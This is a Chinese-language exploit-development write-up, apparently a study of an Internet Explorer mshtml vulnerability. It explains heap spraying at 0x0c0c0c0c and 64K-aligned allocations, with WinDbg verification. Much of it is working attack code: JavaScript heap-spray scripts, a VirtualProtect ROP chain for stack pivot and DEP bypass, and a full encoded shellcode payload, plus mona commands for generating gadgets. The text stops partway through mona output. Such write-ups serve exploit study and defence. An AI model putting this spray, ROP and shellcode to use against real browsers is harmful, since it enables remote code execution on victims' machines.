在堆喷中最著名的地址要数**0x0c0c0c0c**了，解释一下为什么使用这个地址。如果在Exploit中通过覆盖堆栈中的虚表的话，使用这个地址就会十分合适，当虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，示意图:

```
 Stack
+---------+          Object
| obj_ptr | ---->  +--------+        Vtable
+---------+        |p_Vtable| ---> +-------+
|         |        +--------+      |p_func1| ----> func1
+---------+        |        |      +-------+
|         |        +--------+
+---------+
```

假如将obj_ptr覆盖为0x0c0c0c0c，将0x0c0c0c0c地址内的内容填为x0cx0cx0cx0c，那么顺着这条调用链，最后还是会调用0x0c0c0c0c地址处的指令，而且:

```
004010A0  0C 0C   OR AL,0C
004010A2  0C 0C   OR AL,0C
```

计算需要多大的内存块才能喷到0x0c0c0c0c

```
0x0c0c0c0c = 202116108
202116108字节(b)=192.7529411兆字节(mb)
```

但由于分配的起始地址并不是从零开始，所以实际中并不需要那么大的内存，**还有一个要注意的点就是unescape返回的对象在用.length计算长度时返回的是实际长度的一半**

```javascript
> s = unescape("%u4142%u4344%u4546")
> s.length
3
```

一份堆喷射的脚本可能看起来像这样：

```html
<html>
<script>
    tag = unescape('%u4141%u4141');
    chunk = '';
    chunksize = 0x1000;
    nr_of_chunks = 200;
    for (counter = 0; counter < chunksize; counter++) { // 填充0x1000的NOP指令
        chunk += unescape('%u9090%u9090');
    }
    chunk = chunk.substring(0, chunksize - tag.length);
    testarray = new Array();
    for (counter = 0; counter < nr_of_chunks; counter++) { // 0x200个chunk
        testarray[counter] = tag + chunk;
    }
</script>
</html>
```

**XP下IE6和IE7的堆喷**

可以用IE Collection安装多个版本的IE，这里在XP SP3上安装了IE6和IE7用于调试。

```html
<html>
<script>
    var shellcode = unescape('%u4141%u4141');
    var bigblock = unescape('%u9090%u9090');
    var headsize = 20;
    var slackspace = headsize + shellcode.length;
    while (bigblock.length < slackspace) bigblock += bigblock;
    var fillblock = bigblock.substring(0, slackspace);
    var block = bigblock.substring(0, bigblock.length - slackspace);
    while (block.length + slackspace < 0x40000) block = block + block + fillblock;
    var memory = new Array();
    for (i = 0; i < 500; i++) {memory[i] = block + shellcode;}
</script>
</html>
```

分配了500块大小为0x40000 * 2的内存块(.length返回大小为实际大小一半)，结果：

```
0:009> dd 0c0c0c0c
0c0c0c0c  90909090 90909090 90909090 90909090
0c0c0c1c  90909090 90909090 90909090 90909090
...
```

可以尝试多次，发现都是成功的，查看堆的状态：

```
0:009> !heap -stat -h 00140000
 heap @ 00140000
group-by: TOTSIZE max-display: 20
    size     #blocks     total     ( %) (percent of total busy bytes)
    7ffe0 1f5 - fa7c160  (99.78)
    8000 1 - 8000  (0.01)
    7fe0 1 - 7fe0  (0.01)
...
```

基本上块的大小都是0x7ffe0，也就是所分配的0x40000 * 2。

------



回到我们的exp，由于堆空间管理的**对齐**（类似Glibc的对齐）和彼此相邻的性质，分配的堆空间将类似下面这个样子：


这一块参考如下文章（http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html）：

![img](http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png)

> 有一种方法允许你可靠地分配shellcode，使得它既处在可预测的位置，又和内存页面对齐（64K对齐）。为什么要64K对齐？因为堆页地址的十六进制末尾4位为0000。因此，任何javascript字符串将是6个字节长加上Unicode编码字符串的长度。此外，使用VirtualAlloc分配的堆块长度为0x20字节。因此，通过VirtualAlloc分配的shellcode将始终位于偏移0x24处。另外，由于每个分配产生一个64K对齐的地址，我们可以进行一系列完全等于64K的字符串分配。这样，我们的shellcode开头将始终位于类似（0xXXXX0024）的地址。
>
> 以下Javascript代码分配16个64K字符串（即1MB）的数组。注意，第16个分配考虑了堆头和字符串长度，因此只分配了一兆字节。然后将得到的数组分配一百次，从而精确分配100MB。
>
> ```html
> <html>
> <head>
> <script>
> function heapspray(){
> var shellcode = "u\4141";
> 
> while (shellcode.length < 100000)
>  shellcode = shellcode + shellcode;
> 
> var onemeg = shellcode.substr(0, 64*1024/2);
> 
> for (i=0; i<14; i++) {
>  onemeg += shellcode.substr(0, 64*1024/2);
> }
> 
> onemeg += shellcode.substr(0, (64*1024/2)-(38/2));
> 
> var spray = new Array();
> 
> for (i=0; i<100; i++) {
>  spray[i] = onemeg.substr(0, onemeg.length);
> }
> }
> </script>
> </head>
> <input type="button" value="Spray the heap" onclick="heapspray()"></input>
> </body>
> </html>
> ```
>
> 然后运行Windbg调试：
>
> ```
> !heap -stat
> 
> _HEAP 00360000
>   Segments            00000001
>       Reserved  bytes 00100000
>       Committed bytes 000f1000
>   VirtAllocBlocks     00000001
>       VirtAlloc bytes 035f0000
> _HEAP 035b0000
>   Segments            00000001
>       Reserved  bytes 00040000
>       Committed bytes 00019000
>   VirtAllocBlocks     00000000
>       VirtAlloc bytes 00000000
> _HEAP 00750000
>   Segments            00000001
>       Reserved  bytes 00040000
>       Committed bytes 00012000
>   VirtAllocBlocks     00000000
>       VirtAlloc bytes 00000000
> _HEAP 00270000
>   Segments            00000001
>       Reserved  bytes 00010000
>       Committed bytes 00010000
>   VirtAllocBlocks     00000000
>       VirtAlloc bytes 00000000
> _HEAP 02e20000
>   Segments            00000001
>       Reserved  bytes 00040000
>       Committed bytes 00001000
>   VirtAllocBlocks     00000000
>       VirtAlloc bytes 00000000
> _HEAP 00010000
>   Segments            00000001
>       Reserved  bytes 00010000
>       Committed bytes 00001000
>   VirtAllocBlocks     00000000
>       VirtAlloc bytes 00000000
> ```
>
> 查看VirtAlloc bytes 字段很大的分配，第一个地址就是我们所感兴趣的堆地址_HEAP 00360000
>
> 然后，查看堆句柄的分配统计
>
> ```
> !heap -stat -h 00360000
> 
> heap @ 00360000
> group-by: TOTSIZE max-display: 20
>  size     #blocks     total     ( %) (percent of total busy bytes)
>  fffe0 65 - 64ff360  (99.12)
>  40010 1 - 40010  (0.25)
>  1034 10 - 10340  (0.06)
>  20 356 - 6ac0  (0.03)
>  494 16 - 64b8  (0.02)
>  5ba0 1 - 5ba0  (0.02)
>  5e4 b - 40cc  (0.02)
>  4010 1 - 4010  (0.02)
>  3980 1 - 3980  (0.01)
>  d0 3e - 3260  (0.01)
>  460 b - 3020  (0.01)
>  1800 2 - 3000  (0.01)
>  800 6 - 3000  (0.01)
>  468 a - 2c10  (0.01)
>  2890 1 - 2890  (0.01)
>  78 52 - 2670  (0.01)
>  10 215 - 2150  (0.01)
>  1080 2 - 2100  (0.01)
>  2b0 c - 2040  (0.01)
>  2010 1 - 2010  (0.01)
> ```
>
> 可以看到有0x65（101）个size为0xfffe0（1MB减去20字节的堆头）。
>
> 然后查看特定大小的堆块，接下来的命令列出了所有大小为0xfffe0的堆块。
>
> ```
> !heap -flt s fffe0
> 
> 		_HEAP @ 360000
>    HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
>      037f0018 1fffc fffc  [00]   037f0020    fffe0 - (busy VirtualAlloc)
>      038f0018 1fffc fffc  [00]   038f0020    fffe0 - (busy VirtualAlloc)
>      039f0018 1fffc fffc  [00]   039f0020    fffe0 - (busy VirtualAlloc)
>      03af0018 1fffc fffc  [00]   03af0020    fffe0 - (busy VirtualAlloc)
>      03bf0018 1fffc fffc  [00]   03bf0020    fffe0 - (busy VirtualAlloc)
>      05e80018 1fffc fffc  [00]   05e80020    fffe0 - (busy VirtualAlloc)
>      05f80018 1fffc fffc  [00]   05f80020    fffe0 - (busy VirtualAlloc)
>      06080018 1fffc fffc  [00]   06080020    fffe0 - (busy VirtualAlloc)
>      06180018 1fffc fffc  [00]   06180020    fffe0 - (busy VirtualAlloc)
>      …
>      0aa80018 1fffc fffc  [00]   0aa80020    fffe0 - (busy VirtualAlloc)
>      0ab80018 1fffc fffc  [00]   0ab80020    fffe0 - (busy VirtualAlloc)
>      0ac80018 1fffc fffc  [00]   0ac80020    fffe0 - (busy VirtualAlloc)
>      0ad80018 1fffc fffc  [00]   0ad80020    fffe0 - (busy VirtualAlloc)
>      0ae80018 1fffc fffc  [00]   0ae80020    fffe0 - (busy VirtualAlloc)
>      0af80018 1fffc fffc  [00]   0af80020    fffe0 - (busy VirtualAlloc)
>      0b080018 1fffc fffc  [00]   0b080020    fffe0 - (busy VirtualAlloc)
>      0b180018 1fffc fffc  [00]   0b180020    fffe0 - (busy VirtualAlloc)
>      0b280018 1fffc fffc  [00]   0b280020    fffe0 - (busy VirtualAlloc)
>      0b380018 1fffc fffc  [00]   0b380020    fffe0 - (busy VirtualAlloc)
>  _HEAP @ 10000
>  _HEAP @ 270000
>  _HEAP @ 750000
>  _HEAP @ 2e20000
>  _HEAP @ 35b0000
> ```
>
> 每次分配都是顺序分配的。
>
> 因为我们能看到堆块的地址，我们查看一下0x41的位置（即shellcode的位置）：
>
> ```
> 0:007> db 06b80000
> 06b80000  00 00 c8 06 00 00 a8 06-00 00 00 00 00 00 00 00  ................
> 06b80010  00 00 10 00 00 00 10 00-61 65 15 29 00 00 00 04  ........ae.)....
> 06b80020  da ff 0f 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA
> 06b80030  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
> 06b80040  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
> 06b80050  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
> 06b80060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
> 06b80070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
> ```
>
> 我们能够清楚地看到0x20偏移处的值，为字符串的长度——0xfffda，是减去NULL终止符的字符串长度。

理解了这个后，我们再来看exp。

```javascript
    //初始化堆喷数据
    var padding = unescape("%u9090"); // unescape函数将类似%xx和%uxxxx的字符序列（x表示十六进制数字），用Unicode字符\u00xx和\uxxxx替换这样的字符序列进行解码。这里\x90是NOP指令
    while (padding.length < 1000)
        padding = padding + padding; 
    var padding = padding.substr(0, 1000 - shellcode.length);
    shellcode+= padding; // 在ROP+shellcode后padding NOP指令到1000字节，但是内存中实际分配2000字节
    while (shellcode.length < 100000) 
        shellcode = shellcode + shellcode;
    var onemeg = shellcode.substr(0, 64*1024/2); // 64K
    for (i=0; i<14; i++) {
        onemeg += shellcode.substr(0, 64*1024/2);
    }
    onemeg += shellcode.substr(0, (64*1024/2)-(38/2)); // 64K * 16，即1MB

 		//通过堆喷布局rop和shellcode
    var spray = new Array();
    for (i=0; i<100; i++) {
        spray[i] = onemeg.substr(0, onemeg.length);
    }
```

单次堆喷数据的组织形式其实与上述是类似的

- ROP（栈迁移） + shellcode + padding = 1000 byte
- 不断重复，直到64K
- 再以64K的块，扩展到1MB（64KB*16）
- 喷100次，共100MB

稍微看一下ROP链和shellcode的代码：

```javascript
    var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141"); // PADDING

    //ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RETN
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP # RETN
    shellcode+= unescape("%u"+rop5+"%u"+rop6); // XCHG EAX,ESP # RETN
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop7+"%u"+rop8); // POP EBP
    shellcode+= unescape("%u1024%u0000"); // Size 0x00001024
    shellcode+= unescape("%u"+rop9+"%u"+rop10); // POP EDX
    shellcode+= unescape("%u0040%u0000"); // 0x00000040
    shellcode+= unescape("%u"+rop11+"%u"+rop12); // POP ECX
    shellcode+= unescape("%u"+writable1+"%u"+writable2); // Writable Location
    shellcode+= unescape("%u"+rop13+"%u"+rop14); // POP EDI
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RET
    shellcode+= unescape("%u"+rop15+"%u"+rop16); // POP ESI
    shellcode+= unescape("%u"+jmpeax1+"%u"+jmpeax2); // JMP EAX
    shellcode+= unescape("%u"+rop17+"%u"+rop18); // POP EAX
    shellcode+= unescape("%u"+vp1+"%u"+vp2); // VirtualProtect()
    shellcode+= unescape("%u"+rop19+"%u"+rop20); // MOV EAX,DWORD PTR DS:[EAX]
    shellcode+= unescape("%u"+rop21+"%u"+rop22); // PUSHAD
    shellcode+= unescape("%u"+rop23+"%u"+rop24); // PUSH ESP
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs

    //弹出计算器的shellcode
    shellcode+= unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" + 
                             "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" + 
                             "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" + 
                             "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" + 
                             "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" + 
                             "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" + 
                             "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" + 
                             "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" + 
                             "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" + 
                             "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" + 
                             "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" + 
                             "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" + 
                             "%u6c61%u2e63%u7865%u0065");
```

也就是说第一条gadget的前面还有14 * 2 = 28字节(0x1c)的padding，所以第一条gadget的地址应该为0x24+0x1c = 0x40

调试验证：

```
0:005> !heap -stat
_HEAP 003d0000
     Segments            00000001
         Reserved  bytes 00100000
         Committed bytes 00100000
     VirtAllocBlocks     00000001
         VirtAlloc bytes 038b0000
_HEAP 02cc0000
     Segments            00000001
         Reserved  bytes 00040000
         Committed bytes 0002b000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 01240000
     Segments            00000001
         Reserved  bytes 00040000
         Committed bytes 00012000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 002f0000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00010000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 024a0000
     Segments            00000001
         Reserved  bytes 00040000
         Committed bytes 00001000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 00010000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00001000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
0:005> !heap -stat -h 003d0000
 heap @ 003d0000
group-by: TOTSIZE max-display: 20
    size     #blocks     total     ( %) (percent of total busy bytes)
    fffe0 65 - 64ff360  (98.77)
    3e810 1 - 3e810  (0.24)
    100 269 - 26900  (0.15)
    fc fb - f714  (0.06)
    1034 f - f30c  (0.06)
    7d10 1 - 7d10  (0.03)
    494 1b - 7b9c  (0.03)
    20 356 - 6ac0  (0.03)
    58 125 - 64b8  (0.02)
    5ba0 1 - 5ba0  (0.02)
    40 163 - 58c0  (0.02)
    4c 121 - 55cc  (0.02)
    52ac 1 - 52ac  (0.02)
    5e4 b - 40cc  (0.02)
    200c 2 - 4018  (0.02)
    3e90 1 - 3e90  (0.01)
    3de0 1 - 3de0  (0.01)
    3ddc 1 - 3ddc  (0.01)
    3980 1 - 3980  (0.01)
    d0 3d - 3190  (0.01)
0:005> !heap -flt s fffe0
    _HEAP @ 3d0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        03280018 1fffc 0000  [00]   03280020    fffe0 - (busy VirtualAlloc)
        038b0018 1fffc fffc  [00]   038b0020    fffe0 - (busy VirtualAlloc)
        039b0018 1fffc fffc  [00]   039b0020    fffe0 - (busy VirtualAlloc)
        04a00018 1fffc fffc  [00]   04a00020    fffe0 - (busy VirtualAlloc)
        04b00018 1fffc fffc  [00]   04b00020    fffe0 - (busy VirtualAlloc)
        04c00018 1fffc fffc  [00]   04c00020    fffe0 - (busy VirtualAlloc)
        04d00018 1fffc fffc  [00]   04d00020    fffe0 - (busy VirtualAlloc)
        04e00018 1fffc fffc  [00]   04e00020    fffe0 - (busy VirtualAlloc)
        04f00018 1fffc fffc  [00]   04f00020    fffe0 - (busy VirtualAlloc)
        05000018 1fffc fffc  [00]   05000020    fffe0 - (busy VirtualAlloc)
        06550018 1fffc fffc  [00]   06550020    fffe0 - (busy VirtualAlloc)
        06650018 1fffc fffc  [00]   06650020    fffe0 - (busy VirtualAlloc)
        06750018 1fffc fffc  [00]   06750020    fffe0 - (busy VirtualAlloc)
        06850018 1fffc fffc  [00]   06850020    fffe0 - (busy VirtualAlloc)
        06950018 1fffc fffc  [00]   06950020    fffe0 - (busy VirtualAlloc)
        06a50018 1fffc fffc  [00]   06a50020    fffe0 - (busy VirtualAlloc)
        06b50018 1fffc fffc  [00]   06b50020    fffe0 - (busy VirtualAlloc)
        06c50018 1fffc fffc  [00]   06c50020    fffe0 - (busy VirtualAlloc)
        06d50018 1fffc fffc  [00]   06d50020    fffe0 - (busy VirtualAlloc)
        06e50018 1fffc fffc  [00]   06e50020    fffe0 - (busy VirtualAlloc)
        06f50018 1fffc fffc  [00]   06f50020    fffe0 - (busy VirtualAlloc)
        07050018 1fffc fffc  [00]   07050020    fffe0 - (busy VirtualAlloc)
        07150018 1fffc fffc  [00]   07150020    fffe0 - (busy VirtualAlloc)
        07250018 1fffc fffc  [00]   07250020    fffe0 - (busy VirtualAlloc)
        07350018 1fffc fffc  [00]   07350020    fffe0 - (busy VirtualAlloc)
        07450018 1fffc fffc  [00]   07450020    fffe0 - (busy VirtualAlloc)
        07550018 1fffc fffc  [00]   07550020    fffe0 - (busy VirtualAlloc)
        07650018 1fffc fffc  [00]   07650020    fffe0 - (busy VirtualAlloc)
        07750018 1fffc fffc  [00]   07750020    fffe0 - (busy VirtualAlloc)
        07850018 1fffc fffc  [00]   07850020    fffe0 - (busy VirtualAlloc)
        07950018 1fffc fffc  [00]   07950020    fffe0 - (busy VirtualAlloc) # 查看这一块
        07a50018 1fffc fffc  [00]   07a50020    fffe0 - (busy VirtualAlloc)
        07b50018 1fffc fffc  [00]   07b50020    fffe0 - (busy VirtualAlloc)
        07c50018 1fffc fffc  [00]   07c50020    fffe0 - (busy VirtualAlloc)
        07d50018 1fffc fffc  [00]   07d50020    fffe0 - (busy VirtualAlloc)
        07e50018 1fffc fffc  [00]   07e50020    fffe0 - (busy VirtualAlloc)
        07f50018 1fffc fffc  [00]   07f50020    fffe0 - (busy VirtualAlloc)
        08050018 1fffc fffc  [00]   08050020    fffe0 - (busy VirtualAlloc)
        08150018 1fffc fffc  [00]   08150020    fffe0 - (busy VirtualAlloc)
        08250018 1fffc fffc  [00]   08250020    fffe0 - (busy VirtualAlloc)
        08350018 1fffc fffc  [00]   08350020    fffe0 - (busy VirtualAlloc)
        08450018 1fffc fffc  [00]   08450020    fffe0 - (busy VirtualAlloc)
        08550018 1fffc fffc  [00]   08550020    fffe0 - (busy VirtualAlloc)
        08650018 1fffc fffc  [00]   08650020    fffe0 - (busy VirtualAlloc)
        08750018 1fffc fffc  [00]   08750020    fffe0 - (busy VirtualAlloc)
        08850018 1fffc fffc  [00]   08850020    fffe0 - (busy VirtualAlloc)
        08950018 1fffc fffc  [00]   08950020    fffe0 - (busy VirtualAlloc)
        08a50018 1fffc fffc  [00]   08a50020    fffe0 - (busy VirtualAlloc)
        08b50018 1fffc fffc  [00]   08b50020    fffe0 - (busy VirtualAlloc)
        08c50018 1fffc fffc  [00]   08c50020    fffe0 - (busy VirtualAlloc)
        08d50018 1fffc fffc  [00]   08d50020    fffe0 - (busy VirtualAlloc)
        08e50018 1fffc fffc  [00]   08e50020    fffe0 - (busy VirtualAlloc)
        08f50018 1fffc fffc  [00]   08f50020    fffe0 - (busy VirtualAlloc)
        09050018 1fffc fffc  [00]   09050020    fffe0 - (busy VirtualAlloc)
        09150018 1fffc fffc  [00]   09150020    fffe0 - (busy VirtualAlloc)
        09250018 1fffc fffc  [00]   09250020    fffe0 - (busy VirtualAlloc)
        09350018 1fffc fffc  [00]   09350020    fffe0 - (busy VirtualAlloc)
        09450018 1fffc fffc  [00]   09450020    fffe0 - (busy VirtualAlloc)
        09550018 1fffc fffc  [00]   09550020    fffe0 - (busy VirtualAlloc)
        09650018 1fffc fffc  [00]   09650020    fffe0 - (busy VirtualAlloc)
        09750018 1fffc fffc  [00]   09750020    fffe0 - (busy VirtualAlloc)
        09850018 1fffc fffc  [00]   09850020    fffe0 - (busy VirtualAlloc)
        09950018 1fffc fffc  [00]   09950020    fffe0 - (busy VirtualAlloc)
        09a50018 1fffc fffc  [00]   09a50020    fffe0 - (busy VirtualAlloc)
        09b50018 1fffc fffc  [00]   09b50020    fffe0 - (busy VirtualAlloc)
        09c50018 1fffc fffc  [00]   09c50020    fffe0 - (busy VirtualAlloc)
        09d50018 1fffc fffc  [00]   09d50020    fffe0 - (busy VirtualAlloc)
        09e50018 1fffc fffc  [00]   09e50020    fffe0 - (busy VirtualAlloc)
        09f50018 1fffc fffc  [00]   09f50020    fffe0 - (busy VirtualAlloc)
        0a050018 1fffc fffc  [00]   0a050020    fffe0 - (busy VirtualAlloc)
        0a150018 1fffc fffc  [00]   0a150020    fffe0 - (busy VirtualAlloc)
        0a250018 1fffc fffc  [00]   0a250020    fffe0 - (busy VirtualAlloc)
        0a350018 1fffc fffc  [00]   0a350020    fffe0 - (busy VirtualAlloc)
        0a450018 1fffc fffc  [00]   0a450020    fffe0 - (busy VirtualAlloc)
        0a550018 1fffc fffc  [00]   0a550020    fffe0 - (busy VirtualAlloc)
        0a650018 1fffc fffc  [00]   0a650020    fffe0 - (busy VirtualAlloc)
        0a750018 1fffc fffc  [00]   0a750020    fffe0 - (busy VirtualAlloc)
        0a850018 1fffc fffc  [00]   0a850020    fffe0 - (busy VirtualAlloc)
        0a950018 1fffc fffc  [00]   0a950020    fffe0 - (busy VirtualAlloc)
        0aa50018 1fffc fffc  [00]   0aa50020    fffe0 - (busy VirtualAlloc)
        0ab50018 1fffc fffc  [00]   0ab50020    fffe0 - (busy VirtualAlloc)
        0ac50018 1fffc fffc  [00]   0ac50020    fffe0 - (busy VirtualAlloc)
        0ad50018 1fffc fffc  [00]   0ad50020    fffe0 - (busy VirtualAlloc)
        0ae50018 1fffc fffc  [00]   0ae50020    fffe0 - (busy VirtualAlloc)
        0af50018 1fffc fffc  [00]   0af50020    fffe0 - (busy VirtualAlloc)
        0b050018 1fffc fffc  [00]   0b050020    fffe0 - (busy VirtualAlloc)
        0b150018 1fffc fffc  [00]   0b150020    fffe0 - (busy VirtualAlloc)
        0b250018 1fffc fffc  [00]   0b250020    fffe0 - (busy VirtualAlloc)
        0b350018 1fffc fffc  [00]   0b350020    fffe0 - (busy VirtualAlloc)
        0b450018 1fffc fffc  [00]   0b450020    fffe0 - (busy VirtualAlloc)
        0b550018 1fffc fffc  [00]   0b550020    fffe0 - (busy VirtualAlloc)
        0b650018 1fffc fffc  [00]   0b650020    fffe0 - (busy VirtualAlloc)
        0b750018 1fffc fffc  [00]   0b750020    fffe0 - (busy VirtualAlloc)
        0b850018 1fffc fffc  [00]   0b850020    fffe0 - (busy VirtualAlloc)
        0b950018 1fffc fffc  [00]   0b950020    fffe0 - (busy VirtualAlloc)
        0ba50018 1fffc fffc  [00]   0ba50020    fffe0 - (busy VirtualAlloc)
        0bb50018 1fffc fffc  [00]   0bb50020    fffe0 - (busy VirtualAlloc)
        0bc50018 1fffc fffc  [00]   0bc50020    fffe0 - (busy VirtualAlloc)
        0bd50018 1fffc fffc  [00]   0bd50020    fffe0 - (busy VirtualAlloc)
        0be50018 1fffc fffc  [00]   0be50020    fffe0 - (busy VirtualAlloc)
        0bf50018 1fffc fffc  [00]   0bf50020    fffe0 - (busy VirtualAlloc)
    _HEAP @ 10000
    _HEAP @ 2f0000
    _HEAP @ 1240000
    _HEAP @ 24a0000
    _HEAP @ 2cc0000

```

重点关注0x7950018这一块，可以看到从0x7950024开始是0x1c字节的padding，然后就是shellcode，也就是说0x79500040是一个可用的gadget地址。

```
0:005> dd 07950018 L 100
07950018  2498ef9a 04000000 000fffda 41414141
07950028  42424242 43434343 41414141 42424242
07950038  43434343 41414141 6b661041 6b662c60
07950048  6b67b43b 6b662c60 6b662c60 6b663059
07950058  00001024 6b6fced0 00000040 6b662fa9
07950068  6bb9fe20 6b6630ae 6b661041 6b662f0b
07950078  6b66f920 6b674ef7 6b661348 6b6cf0bb
07950088  6b6994a1 6b6c3d7e 90909090 90909090
07950098  90909090 0089e8fc 89600000 64d231e5
079500a8  8b30528b 528b0c52 28728b14 264ab70f
079500b8  c031ff31 7c613cac c1202c02 c7010dcf
079500c8  5752f0e2 8b10528b d0013c42 8578408b
079500d8  014a74c0 488b50d0 20588b18 3ce3d301
079500e8  8b348b49 ff31d601 c1acc031 c7010dcf
079500f8  f475e038 3bf87d03 e275247d 24588b58
07950108  8b66d301 588b4b0c 8bd3011c d0018b04
07950118  24244489 59615b5b e0ff515a 8b5a5f58
07950128  5d86eb12 858d016a 000000b9 8b316850
07950138  d5ff876f a2b5f0bb 95a66856 d5ff9dbd
07950148  0a7c063c 75e0fb80 1347bb05 006a6f72
07950158  63d5ff53 2e636c61 00657865 90909090
07950168  90909090 90909090 90909090 90909090
07950178  90909090 90909090 90909090 90909090
07950188  90909090 90909090 90909090 90909090
07950198  90909090 90909090 90909090 90909090
079501a8  90909090 90909090 90909090 90909090
079501b8  90909090 90909090 90909090 90909090
079501c8  90909090 90909090 90909090 90909090
079501d8  90909090 90909090 90909090 90909090
079501e8  90909090 90909090 90909090 90909090
079501f8  90909090 90909090 90909090 90909090
07950208  90909090 90909090 90909090 90909090
07950218  90909090 90909090 90909090 90909090
07950228  90909090 90909090 90909090 90909090
07950238  90909090 90909090 90909090 90909090
07950248  90909090 90909090 90909090 90909090
07950258  90909090 90909090 90909090 90909090
07950268  90909090 90909090 90909090 90909090
07950278  90909090 90909090 90909090 90909090
07950288  90909090 90909090 90909090 90909090

```

同理，可用地址还有0810，0fe0，17b0，1f80……，每次增加0x7d0，这是因为一个最小单元的块是1000*2（0x7d0）。所以exp中的0x6da0也符合条件，验证如下：

```
0:005> dd 079f6da0
079f6da0  6b661041 6b662c60 6b67b43b 6b662c60
079f6db0  6b662c60 6b663059 00001024 6b6fced0
079f6dc0  00000040 6b662fa9 6bb9fe20 6b6630ae
079f6dd0  6b661041 6b662f0b 6b66f920 6b674ef7
079f6de0  6b661348 6b6cf0bb 6b6994a1 6b6c3d7e
079f6df0  90909090 90909090 90909090 0089e8fc
079f6e00  89600000 64d231e5 8b30528b 528b0c52
079f6e10  28728b14 264ab70f c031ff31 7c613cac

```

至此，我们终于理清了堆喷的思路，就是整齐的摆放堆块，使得gadget地址位于可预测的位置，在Glibc pwn中也有类似细微的操作。

**不过还需要提一句的是，CButtonLayout对象的vftable是如何控制调用流程的呢？即，这个虚函数是在什么时候被怎样调用的？**

在xchg指令处下断点：

```
0:013> bp 0x1B43B+686a0000 
0:013> g
ModLoad: 6c4f0000 6c5a2000   C:\Windows\System32\jscript.dll
Breakpoint 0 hit
eax=079f6da0 ebx=01000000 ecx=034cd3b0 edx=00000041 esi=024ccf00 edi=034cea40
eip=686bb43b esp=024ccd38 ebp=024ccd70 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTreeNode::GetParentWidth+0x9c:
686bb43b 94              xchg    eax,esp
0:005> dd 034cd3b0 
034cd3b0  079f6da0 0047e9e0 034cea40 687f8690
034cd3c0  79f6da08 00000000 01080809 ffffffff
034cd3d0  00000000 00000000 00000000 ffffffff
034cd3e0  00000080 ffffffff 00000000 00000000
034cd3f0  00000000 00000000 00000000 00000024
034cd400  00000020 00000000 00000000 00000000
034cd410  00000000 00000000 00000000 00000000
034cd420  00000000 00000000 00000000 00000000

```

**此时eax实际上为要栈迁移的地址，而这个地址来源于ecx，应该有`mov eax, [ecx]`，所以之前的call [eax+8]实际上就是直接跳转到`xchg`这条指令，然后将esp修改为第一条gadget的地址（retn），然后再通过第二条gadget pop;ret，将`xchg`指令过掉，从而执行下面的`VirtualProtect`ROP。**

#### Rop链

现在我们已经将EIP劫持到了可控位置，下一步就是写Rop链了。

首先使用mona的rop方法试一下：

```
!py mona.py rop -m mshtml.dll -cpb \x00
```

确实手动生成了rop链，但是耗时较长。

输出文件有stackpivot.txt, rop.txt, rop_suggestions.txt和rop_chains.txt。最终的结果是在rop_chains.txt中

```
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x72a50000 | 0x734d0000 | 0x00a80000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [IEFRAME.dll] (C:\Windows\system32\IEFRAME.dll)
